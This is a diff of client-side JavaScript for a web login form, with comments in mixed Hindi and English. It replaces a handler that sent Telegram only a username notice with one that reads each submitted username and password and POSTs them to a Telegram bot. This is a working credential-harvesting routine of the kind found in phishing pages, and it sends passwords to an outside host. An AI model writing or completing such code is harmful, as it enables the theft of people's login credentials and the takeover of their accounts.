@@ -1,19 +1,31 @@
-// Replace with your bot token and chat ID
+// apna BOT TOKEN yahan dalen
 const telegramBotToken = 'YOUR_BOT_TOKEN';
 const chatId = 'YOUR_CHAT_ID';
 
-// Send a **generic** notification to Telegram
-async function sendToTelegram(textMessage) {
-  // use the argument `textMessage` directly
-  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}`;
+// Function to send login data to Telegram
+async function sendToTelegram(username, password) {
+  // message text
+  const message = `🔔 Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+  // Telegram API URL
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
   try {
-    const response = await fetch(url);
+    // POST request bhejna Telegram par
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
     const result = await response.json();
     if (result.ok) {
-      console.log('Message sent to Telegram successfully.');
+      console.log('✅ Message sent to Telegram successfully.');
     } else {
-      console.error('Failed to send message to Telegram.');
+      console.error('⚠️ Failed to send message to Telegram:', result);
     }
   } catch (error) {
     console.error('Error sending message:', error);
@@ -21,20 +33,18 @@ async function sendToTelegram(textMessage) {
 }
 
 // Handle form submission
-document.addEventListener('DOMContentLoaded', () => {
-  const form = document.getElementById('loginForm');
+document.getElementById('loginForm').addEventListener('submit', function (event) {
+  event.preventDefault();
 
-  form.addEventListener('submit', (event) => {
-    event.preventDefault();
+  const username = event.target.username.value;
+  const password = event.target.password.value;
 
-    const username = form.username.value;
+  // send to telegram
+  sendToTelegram(username, password);
 
-    // Build your safe message string here
-    const safeMessage = `A login attempt occurred for username: ${username}`;
+  // success message
+  alert('Login details sent to Telegram!');
 
-    // send the safe message
-    sendToTelegram(safeMessage);
-
-    alert('Login attempt recorded safely.');
-  });
+  // optional: clear form
+  event.target.reset();
 });
